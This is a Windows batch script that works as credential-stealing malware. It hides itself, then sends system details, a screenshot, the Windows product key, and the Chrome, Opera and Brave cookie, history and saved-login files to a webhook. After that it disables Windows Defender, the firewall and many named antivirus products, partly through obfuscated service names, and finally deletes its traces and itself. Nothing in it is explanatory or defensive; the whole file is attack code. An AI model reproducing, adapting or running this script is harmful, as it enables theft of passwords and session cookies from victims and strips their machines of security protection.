@echo off
attrib +h %0
set "webhook=""
#=============
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```NEW USER %username% (%ComputerName%)```\"}"  %webhook%
curl --silent --output /dev/null -F ss=@"%appdata%\s.png" %webhook%
curl -o ok69.txt https://extreme-ip-lookup.com/json/?key=3Ywhtw1MYNLZlZgtAx0U --silent
set "gowno=%appdata%\ok69.txt"
curl --silent --output /dev/null -F s=@"%gowno%" %webhook%
del ok69.txt
#=============
#=============
set "Programss=%temp%\programms.txt"
curl --silent --output /dev/null -F s=@"%Programss%" %webhook%
powershell -Command "Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table >%userprofile%\AppData\Local\Temp\programms.txt "
del %temp%\programms.txt
#=============
#=============
echo Hard Drive Space:>%userprofile%\AppData\Local\Temp\System_INFO.txt
wmic diskdrive get size>>%userprofile%\AppData\Local\Temp\System_INFO.txt
echo Service Tag:>>%userprofile%\AppData\Local\Temp\System_INFO.txt
wmic bios get serialnumber>>%userprofile%\AppData\Local\Temp\System_INFO.txt
echo CPU:>>%userprofile%\AppData\Local\Temp\System_INFO.txt
wmic cpu get name>>%userprofile%\AppData\Local\Temp\System_INFO.txt
set "System_INFO=%temp%\System_INFO.txt"
curl --silent --output /dev/null -F s=@"%System_INFO%" %webhook%
del %temp%\System_INFO.txt
#=============
#=============
systeminfo>%userprofile%\AppData\Local\Temp\sysi.txt
set "sysi=%temp%\sysi.txt"
curl --silent --output /dev/null -F s=@"%sysi%" %webhook%
del %temp%\sysi.txt
#=============
#=============
wmic csproduct get uuid >%userprofile%\AppData\Local\Temp\uuid.txt
systeminfo>%userprofile%\AppData\Local\Temp\uuid.txt
set "uuid=%temp%\uuid.txt"
del %temp%\uuid.txt
#=============
#=============
echo $SERDO = Get-Clipboard >%userprofile%\AppData\Local\Temp\test.ps1
echo function Get-ScreenCapture >>%userprofile%\AppData\Local\Temp\test.ps1
echo { >>%userprofile%\AppData\Local\Temp\test.ps1
echo     begin { >>%userprofile%\AppData\Local\Temp\test.ps1
echo         Add-Type -AssemblyName System.Drawing, System.Windows.Forms >>%userprofile%\AppData\Local\Temp\test.ps1
echo         Add-Type -AssemblyName System.Drawing >>%userprofile%\AppData\Local\Temp\test.ps1
echo         $jpegCodec = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() ^|  >>%userprofile%\AppData\Local\Temp\test.ps1
echo             Where-Object { $_.FormatDescription -eq "JPEG" } >>%userprofile%\AppData\Local\Temp\test.ps1
echo     } >>%userprofile%\AppData\Local\Temp\test.ps1
echo     process { >>%userprofile%\AppData\Local\Temp\test.ps1
echo         Start-Sleep -Milliseconds 44 >>%userprofile%\AppData\Local\Temp\test.ps1
echo             [Windows.Forms.Sendkeys]::SendWait("{PrtSc}")    >>%userprofile%\AppData\Local\Temp\test.ps1
echo         Start-Sleep -Milliseconds 550 >>%userprofile%\AppData\Local\Temp\test.ps1
echo         $bitmap = [Windows.Forms.Clipboard]::GetImage()     >>%userprofile%\AppData\Local\Temp\test.ps1
echo         $ep = New-Object Drawing.Imaging.EncoderParameters   >>%userprofile%\AppData\Local\Temp\test.ps1
echo         $ep.Param[0] = New-Object Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality, [long]100)   >>%userprofile%\AppData\Local\Temp\test.ps1
echo         $screenCapturePathBase = $env:temp + " \ " + $env:UserName + "_Capture" >>%userprofile%\AppData\Local\Temp\test.ps1
echo         $bitmap.Save("${screenCapturePathBase}.jpg", $jpegCodec, $ep) >>%userprofile%\AppData\Local\Temp\test.ps1
echo     } >>%userprofile%\AppData\Local\Temp\test.ps1
echo }							 >>%userprofile%\AppData\Local\Temp\test.ps1			
echo Get-ScreenCapture >>%userprofile%\AppData\Local\Temp\test.ps1
echo Set-Clipboard -Value $SERDO >>%userprofile%\AppData\Local\Temp\test.ps1
echo $result  = "%webhook%"  >>%userprofile%\AppData\Local\Temp\test.ps1
echo $screenCapturePathBase = $env:temp + " \ " + $env:UserName + "_Capture.jpg"	 >>%userprofile%\AppData\Local\Temp\test.ps1															
echo curl.exe -i -F file=@"$screenCapturePathBase" $result >>%userprofile%\AppData\Local\Temp\test.ps1
timeout 1 >NUL
Powershell.exe -executionpolicy remotesigned -File  %userprofile%\AppData\Local\Temp\test.ps1 && del %userprofile%\AppData\Local\Temp\test.ps1  
#=============
#=============
echo Set WshShell = CreateObject("WScript.Shell") >%userprofile%\AppData\Local\Temp\key.vbs
echo Set FSO = CreateObject("Scripting.FileSystemObject") >>%userprofile%\AppData\Local\Temp\key.vbs
echo Set File = FSO.CreateTextFile("%userprofile%\AppData\Local\Temp\Productkey.txt",True) >>%userprofile%\AppData\Local\Temp\key.vbs
echo File.Write ConvertToKey(WshShell.RegRead("HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\DigitalProductId")) >>%userprofile%\AppData\Local\Temp\key.vbs
echo File.Close >>%userprofile%\AppData\Local\Temp\key.vbs
echo Function ConvertToKey(Key) >>%userprofile%\AppData\Local\Temp\key.vbs
echo Const KeyOffset = 52 >>%userprofile%\AppData\Local\Temp\key.vbs
echo i = 28 >>%userprofile%\AppData\Local\Temp\key.vbs
echo Chars = "BCDFGHJKMPQRTVWXY2346789" >>%userprofile%\AppData\Local\Temp\key.vbs
echo Do >>%userprofile%\AppData\Local\Temp\key.vbs
echo Cur = 0 >>%userprofile%\AppData\Local\Temp\key.vbs
echo x = 14 >>%userprofile%\AppData\Local\Temp\key.vbs
echo Do >>%userprofile%\AppData\Local\Temp\key.vbs
echo Cur = Cur * 256 >>%userprofile%\AppData\Local\Temp\key.vbs
echo Cur = Key(x + KeyOffset) + Cur >>%userprofile%\AppData\Local\Temp\key.vbs
echo Key(x + KeyOffset) = (Cur \ 24) And 255 >>%userprofile%\AppData\Local\Temp\key.vbs
echo Cur = Cur Mod 24 >>%userprofile%\AppData\Local\Temp\key.vbs
echo x = x -1 >>%userprofile%\AppData\Local\Temp\key.vbs
echo Loop While x ^>= 0 >>%userprofile%\AppData\Local\Temp\key.vbs
echo i = i -1 >>%userprofile%\AppData\Local\Temp\key.vbs
echo KeyOutput = Mid(Chars, Cur + 1, 1) ^& KeyOutput >>%userprofile%\AppData\Local\Temp\key.vbs
echo If (((29 - i) Mod 6) = 0) And (i ^<^> -1) Then >>%userprofile%\AppData\Local\Temp\key.vbs
echo i = i -1 >>%userprofile%\AppData\Local\Temp\key.vbs
echo KeyOutput = " - " ^& KeyOutput >>%userprofile%\AppData\Local\Temp\key.vbs
echo End If >>%userprofile%\AppData\Local\Temp\key.vbs
echo Loop While i ^>= 0 >>%userprofile%\AppData\Local\Temp\key.vbs
echo ConvertToKey = KeyOutput >>%userprofile%\AppData\Local\Temp\key.vbs
echo End Function >>%userprofile%\AppData\Local\Temp\key.vbs
start %userprofile%\AppData\Local\Temp\key.vbs
timeout 1 >NUL
set /p keya=<%localappdata%\Temp\Productkey.txt
curl -X POST -H "Content-type: Application/ json" --data "{\"content\": \"Productkey: %keya%\"}" %webhook%
#=============
#=============
curl -X POST -H "Content-type: Application/ json" --data "{\"content\": \"Chrome data \"}" %webhook%
curl -F c=@"%localappdata%\Google\Chrome\User Data\Default\Cookies" %webhook%
curl -F h=@"%localappdata%\Google\Chrome\User Data\Default\History" %webhook%
curl -F s=@"%localappdata%\Google\Chrome\User Data\Default\Shortcuts" %webhook%
curl -F b=@"%localappdata%\Google\Chrome\User Data\Default\Bookmarks" %webhook%
curl -F l=@"%localappdata%\Google\Chrome\User Data\Default\Login Data" %webhook%
curl -F l=@"%localappdata%\Google\Chrome\User Data\Local State" %webhook%
#=============
#=============
curl -X POST -H "Content-type: Application/ json" --data "{\"content\": \"Opera data: \"}" %webhook%
curl -F c=@"%appdata%\Opera Software\Opera Stable\Cookies" %webhook%
curl -F h=@"%appdata%\Opera Software\Opera Stable\History" %webhook%
curl -F s=@"%appdata%\Opera Software\Opera Stable\Shortcuts" %webhook%
curl -F b=@"%appdata%\Opera Software\Opera Stable\Bookmarks" %webhook%
curl -F l=@"%appdata%\Opera Software\Opera Stable\Login Data" %webhook%
curl -X POST -H "Content-type: Application/ json" --data "{\"content\": \"Brave data: \"}" %webhook%
curl -F ff=@"%localappdata%\BraveSoftware\Brave-Browser\User Data\Default\Bookmarks" %webhook%
curl -F hf=@"%localappdata%\BraveSoftware\Brave-Browser\User Data\Default\History" %webhook%
curl -F df=@"%localappdata%\BraveSoftware\Brave-Browser\User Data\Default\Login Data" %webhook%
curl -F daf=@"%localappdata%\BraveSoftware\Brave-Browser\User Data\Default\Shortcuts" %webhook%
#=============
#=============
net stop "SDRSVC"
#=============
#=============
net stop "WinDefend"
taskkill /f /t /im "MSASCui.exe"
net stop "security center"
net stop sharedaccess
netsh firewall set opmode mode-disable
rem https://technet.microsoft.com/en-us/itpro/powershell/windows/defender/set-mppreference
rem To also disable Windows Defender Security Center include this
rem reg add "HKLM\System\CurrentControlSet\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d "4" /f
rem 1 - Disable Real-time protection
reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" / v "DisableAntiVirus" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine" /v "MpEnablePus" /t REG_DWORD /d "0" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" / v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" / v "DisableOnAccessProtection" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" / v "DisableScanOnRealtimeEnable" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Reporting" /v "DisableEnhancedNotifications" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" / v "DisableBlockAtFirstSeen" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SpynetReporting" /t REG_DWORD /d "0" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" / v "SubmitSamplesConsent" /t REG_DWORD /d "0" /f
rem 0 - Disable Logging
reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger" /v "Start" /t REG_DWORD /d "0" /f
reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderAuditLogger" / v "Start" /t REG_DWORD /d "0" /f
rem Disable WD Tasks
schtasks /Change /TN "Microsoft\Windows\ExploitGuard\ExploitGuard MDM policy Refresh" / Disable
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /Disable
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cleanup" / Disable
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /Disable
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Verification" / Disable
rem Disable WD systray icon
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" / v "Windows Defender" /f
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Defender" /f
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" / v "WindowsDefender" /f
rem Remove WD context menu
reg delete "HKCR\*\shellex\ContextMenuHandlers\EPP" / f
reg delete "HKCR\Directory\shellex\ContextMenuHandlers\EPP" /f
reg delete "HKCR\Drive\shellex\ContextMenuHandlers\EPP" / f
rem Disable WD services
rem For these to execute successfully, you may need to boot into safe mode due to tamper protect
reg add "HKLM\System\CurrentControlSet\Services\WdBoot" / v "Start" / t REG_DWORD /d "4" / f
reg add "HKLM\System\CurrentControlSet\Services\WdFilter" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\System\CurrentControlSet\Services\WdNisDrv" / v "Start" / t REG_DWORD /d "4" / f
reg add "HKLM\System\CurrentControlSet\Services\WdNisSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\System\CurrentControlSet\Services\WinDefend" / v "Start" / t REG_DWORD /d "4" /f
reg add "HKLM\System\CurrentControlSet\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d "4" /f
rem added the following on 07/25/19 for win10v1903
reg add "HKLM\System\CurrentControlSet\Services\Sense" /v "Start" /t REG_DWORD /d "4" /f
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityHealth" /f
net stop "MpsSvc"
taskkill /f /t /im "FirewallControlPanel.exe"
#=============
#=============
net stop "Security Center"
netsh firewall set opmode mode=disable
tskill /A av*
tskill /A fire*
tskill /A anti*
cls
tskill /A spy*
tskill /A bullguard
tskill /A PersFw
tskill /A KAV*
tskill /A ZONEALARM
tskill /A SAFEWEB
cls
tskill /A OUTPOST
tskill /A nv*
tskill /A nav*
tskill /A F-*
tskill /A ESAFE
tskill /A cle
cls
tskill /A BLACKICE
tskill /A def*
tskill /A kav
tskill /A kav*
tskill /A avg*
tskill /A ash*
cls
tskill /A aswupdsv
tskill /A ewid*
tskill /A guard*
tskill /A guar*
tskill /A gcasDt*
tskill /A msmp*
cls
tskill /A mcafe*
tskill /A mghtml
tskill /A msiexec
tskill /A outpost
tskill /A isafe
tskill /A zap*
cls
tskill /A zauinst
tskill /A upd*
tskill /A zlclien*
tskill /A minilog
tskill /A cc*
tskill /A norton*
cls
tskill /A norton au*
tskill /A ccc*
tskill /A npfmn*
tskill /A loge*
tskill /A nisum*
tskill /A issvc
tskill /A tmp*
cls
tskill /A tmn*
tskill /A pcc*
tskill /A cpd*
tskill /A pop*
tskill /A pav*
tskill /A padmin
cls
tskill /A panda*
tskill /A avsch*
tskill /A sche*
tskill /A syman*
tskill /A virus*
tskill /A realm*
cls
tskill /A sweep*
tskill /A scan*
tskill /A ad-*
tskill /A safe*
tskill /A avas*
tskill /A norm*
cls
tskill /A offg*
del /Q /F C:\Program Files\alwils~1\avast4\*.* 
del /Q /F C:\Program Files\Lavasoft\Ad-awa~1\*.exe 
del /Q /F C:\Program Files\kasper~1\*.exe 
cls
del /Q /F C:\Program Files\trojan~1\*.exe 
del /Q /F C:\Program Files\f-prot95\*.dll 
del /Q /F C:\Program Files\tbav\*.dat 
cls
del /Q /F C:\Program Files\avpersonal\*.vdf 
del /Q /F C:\Program Files\Norton~1\*.cnt 
del /Q /F C:\Program Files\Mcafee\*.* 
cls
del /Q /F C:\Program Files\Norton~1\Norton~1\Norton~3\*.* 
del /Q /F C:\Program Files\Norton~1\Norton~1\speedd~1\*.* 
del /Q /F C:\Program Files\Norton~1\Norton~1\*.* 
del /Q /F C:\Program Files\Norton~1\*.* 
cls
del /Q /F C:\Program Files\avgamsr\*.exe 
del /Q /F C:\Program Files\avgamsvr\*.exe 
del /Q /F C:\Program Files\avgemc\*.exe 
cls
del /Q /F C:\Program Files\avgcc\*.exe 
del /Q /F C:\Program Files\avgupsvc\*.exe 
del /Q /F C:\Program Files\grisoft 
del /Q /F C:\Program Files\nood32krn\*.exe 
del /Q /F C:\Program Files\nood32\*.exe 
cls
del /Q /F C:\Program Files\nod32 
del /Q /F C:\Program Files\nood32
del /Q /F C:\Program Files\kav\*.exe 
del /Q /F C:\Program Files\kavmm\*.exe 
del /Q /F C:\Program Files\kaspersky\*.*
cls
del /Q /F C:\Program Files\ewidoctrl\*.exe 
del /Q /F C:\Program Files\guard\*.exe 
del /Q /F C:\Program Files\ewido\*.exe 
cls
del /Q /F C:\Program Files\pavprsrv\*.exe 
del /Q /F C:\Program Files\pavprot\*.exe 
del /Q /F C:\Program Files\avengine\*.exe 
cls
del /Q /F C:\Program Files\apvxdwin\*.exe 
del /Q /F C:\Program Files\webproxy\*.exe 
del /Q /F C:\Program Files\panda software\*.* 
net stop "Security Center"
netsh firewall set opmode mode=disable
tskill /A av*
tskill /A fire*
tskill /A anti*
cls
tskill /A spy*
tskill /A bullguard
tskill /A PersFw
tskill /A KAV*
tskill /A ZONEALARM
tskill /A SAFEWEB
cls
tskill /A OUTPOST
tskill /A nv*
tskill /A nav*
tskill /A F-*
tskill /A ESAFE
tskill /A cle
cls
tskill /A BLACKICE
tskill /A def*
tskill /A kav
tskill /A kav*
tskill /A avg*
tskill /A ash*
cls
tskill /A aswupdsv
tskill /A ewid*
tskill /A guard*
tskill /A guar*
tskill /A gcasDt*
tskill /A msmp*
cls
tskill /A mcafe*
tskill /A mghtml
tskill /A msiexec
tskill /A outpost
tskill /A isafe
tskill /A zap*
cls
tskill /A zauinst
tskill /A upd*
tskill /A zlclien*
tskill /A minilog
tskill /A cc*
tskill /A norton*
cls
tskill /A norton au*
tskill /A ccc*
tskill /A npfmn*
tskill /A loge*
tskill /A nisum*
tskill /A issvc
tskill /A tmp*
cls
tskill /A tmn*
tskill /A pcc*
tskill /A cpd*
tskill /A pop*
tskill /A pav*
tskill /A padmin
cls
tskill /A panda*
tskill /A avsch*
tskill /A sche*
tskill /A syman*
tskill /A virus*
tskill /A realm*
cls
tskill /A sweep*
tskill /A scan*
tskill /A ad-*
tskill /A safe*
tskill /A avas*
tskill /A norm*
cls
tskill /A offg*
del /F /Q %SystemDrive%\recycler\S-1-5-21-1202660629-261903793-725345543-1003\run.bat
set ii=ne
set ywe=st
set ury=t
set iej=op
set jt53=Syma
set o6t=nor
set lyd2=fee
set h3d=ton
set gf45=ntec
set own5=McA
%ii%%ury% %ywe%%iej% "Security Center" /y
%ii%%ury% %ywe%%iej% "Automatic Updates" / y
%ii%%ury% %ywe%%iej% "%jt53%%gf45% Core LC" /y
%ii%%ury% %ywe%%iej% "SAVScan" / y
%ii%%ury% %ywe%%iej% "%o6t%%h3d% AntiVirus Firewall Monitor Service" /y
%ii%%ury% %ywe%%iej% "%o6t%%h3d% AntiVirus Auto-Protect Service" / y
%ii%%ury% %ywe%%iej% "%o6t%%h3d% AntiVirus Auto Protect Service" /y
%ii%%ury% %ywe%%iej% "%own5%%lyd2% Spamkiller Server" / y
%ii%%ury% %ywe%%iej% "%own5%%lyd2% Personal Firewall Service" /y
%ii%%ury% %ywe%%iej% "%own5%%lyd2% SecurityCenter Update Manager" / y
%ii%%ury% %ywe%%iej% "%jt53%%gf45% SPBBCSvc" /y
cls
%ii%%ury% %ywe%%iej% "Ahnlab Task Scheduler" /y
%ii%%ury% %ywe%%iej% navapsvc /y
%ii%%ury% %ywe%%iej% "Sygate Personal Firewall Pro" /y
%ii%%ury% %ywe%%iej% vrmonsvc /y
%ii%%ury% %ywe%%iej% MonSvcNT /y
%ii%%ury% %ywe%%iej% SAVScan /y
%ii%%ury% %ywe%%iej% NProtectService /y
%ii%%ury% %ywe%%iej% ccSetMGR /y
%ii%%ury% %ywe%%iej% ccEvtMGR /y
%ii%%ury% %ywe%%iej% srservice /y
%ii%%ury% %ywe%%iej% "%jt53%%gf45% Network Drivers Service" /y
%ii%%ury% %ywe%%iej% "%o6t%%h3d% Unerase Protection" /y
%ii%%ury% %ywe%%iej% MskService /y
%ii%%ury% %ywe%%iej% MpfService /y
%ii%%ury% %ywe%%iej% mcupdmgr.exe /y
%ii%%ury% %ywe%%iej% "%own5%%lyd2%AntiSpyware" /y
%ii%%ury% %ywe%%iej% helpsvc /y
%ii%%ury% %ywe%%iej% ERSvc /y
%ii%%ury% %ywe%%iej% " *%o6t%%h3d%*" /y
%ii%%ury% %ywe%%iej% " *%jt53%%gf45%*" /y
%ii%%ury% %ywe%%iej% " *%own5%%lyd2%*" /y
cls
%ii%%ury% %ywe%%iej% ccPwdSvc /y
%ii%%ury% %ywe%%iej% "%jt53%%gf45% Core LC" /y
%ii%%ury% %ywe%%iej% navapsvc /y
%ii%%ury% %ywe%%iej% "Serv-U" /y
%ii%%ury% %ywe%%iej% "%o6t%%h3d% AntiVirus Auto Protect Service" / y
%ii%%ury% %ywe%%iej% "%o6t%%h3d% AntiVirus Client" /y
%ii%%ury% %ywe%%iej% "%jt53%%gf45% AntiVirus Client" / y
%ii%%ury% %ywe%%iej% "%o6t%%h3d% AntiVirus Server" /y
%ii%%ury% %ywe%%iej% "NAV Alert" / y
%ii%%ury% %ywe%%iej% "Nav Auto-Protect" /y
cls
%ii%%ury% %ywe%%iej% "McShield" /y
%ii%%ury% %ywe%%iej% "DefWatch" /y
%ii%%ury% %ywe%%iej% eventlog /y
%ii%%ury% %ywe%%iej% InoRPC /y
%ii%%ury% %ywe%%iej% InoRT /y
%ii%%ury% %ywe%%iej% InoTask /y
cls
%ii%%ury% %ywe%%iej% "%o6t%%h3d% AntiVirus Auto Protect Service" /y
%ii%%ury% %ywe%%iej% "%o6t%%h3d% AntiVirus Client" /y
%ii%%ury% %ywe%%iej% "%o6t%%h3d% AntiVirus Corporate Edition" /y
%ii%%ury% %ywe%%iej% "ViRobot Professional Monitoring" /y
%ii%%ury% %ywe%%iej% "PC-cillin Personal Firewall" /y
%ii%%ury% %ywe%%iej% "Trend Micro Proxy Service" /y
%ii%%ury% %ywe%%iej% "Trend NT Realtime Service" /y
%ii%%ury% %ywe%%iej% "%own5%%lyd2%.com McShield" /y
%ii%%ury% %ywe%%iej% "%own5%%lyd2%.com VirusScan Online Realtime Engine" /y
%ii%%ury% %ywe%%iej% "SyGateService" /y
%ii%%ury% %ywe%%iej% "Sygate Personal Firewall Pro" /y
cls
%ii%%ury% %ywe%%iej% "Sophos Anti-Virus" / y
%ii%%ury% %ywe%%iej% "Sophos Anti-Virus Network" /y
%ii%%ury% %ywe%%iej% "eTrust Antivirus Job Server" / y
%ii%%ury% %ywe%%iej% "eTrust Antivirus Realtime Server" /y
%ii%%ury% %ywe%%iej% "Sygate Personal Firewall Pro" / y
%ii%%ury% %ywe%%iej% "eTrust Antivirus RPC Server" /y
cls
%ii%%ury% %ywe%%iej% netsvcs
%ii%%ury% %ywe%%iej% spoolnt

#=============
del %localappdata%\Temp\ip.txt 
del %localappdata%\Temp\ipp.txt 
del %localappdata%\Temp\sysi.txt 
del %localappdata%\Temp\System_INFO.txt 
del %localappdata%\Temp\netstat.txt 
del %localappdata%\Temp\test.ps1 
del %localappdata%\Temp\programms.txt 
del %localappdata%\Temp\%username%_Capture.jpg
del %localappdata%\Temp\uuid.txt
del %localappdata%\Temp\testtttt.ps1 
del %localappdata%\Temp\wlan.txt
del %localappdata%\Temp\key.vbs
del %localappdata%\Temp\Productkey.txt
DEL "%~f0"
cls
cls
cls
cls
TaskKill /F /IM CMD.exe
